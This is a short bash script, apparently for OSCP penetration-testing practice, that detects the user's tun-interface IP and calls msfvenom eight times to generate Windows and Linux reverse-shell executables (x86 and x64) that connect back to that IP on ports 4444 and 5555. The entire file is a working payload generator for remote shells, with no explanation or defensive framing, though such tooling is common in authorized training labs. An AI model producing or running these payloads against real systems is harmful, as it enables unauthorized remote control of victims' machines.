#!/bin/bash

oscpip=`ip a | egrep -o "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*tun" | egrep -o "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"`

echo "Creating windows 32-bit reverse shell for IP: $oscpip on port 4444..."
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=$oscpip LPORT=4444 -f exe -o reverse_x86_4444.exe

echo -e "\n\nCreating windows 32-bit reverse shell for IP: $oscpip on port 5555..."
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=$oscpip LPORT=5555 -f exe -o reverse_x86_5555.exe

echo -e "\n\nCreating windows 64-bit reverse shell for IP: $oscpip on port 5555..."
msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=$oscpip LPORT=5555 -f exe -o reverse_5555.exe

echo -e "\n\nCreating windows 64-bit reverse shell for IP: $oscpip on port 4444..."
msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=$oscpip LPORT=4444 -f exe -o reverse_4444.exe

echo -e "\n\nCreating linux 32-bit reverse shell for IP: $oscpip on port 4444..."
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$oscpip LPORT=4444 -f elf -o reverse_x86_4444

echo -e "\n\nCreating linux 32-bit reverse shell for IP: $oscpip on port 5555..."
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$oscpip LPORT=5555 -f elf -o reverse_x86_5555

echo -e "\n\nCreating linux 64-bit reverse shell for IP: $oscpip on port 4444..."
msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=$oscpip LPORT=4444 -f elf -o reverse_4444

echo -e "\n\nCreating linux 64-bit reverse shell for IP: $oscpip on port 5555..."
msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=$oscpip LPORT=5555 -f elf -o reverse_5555
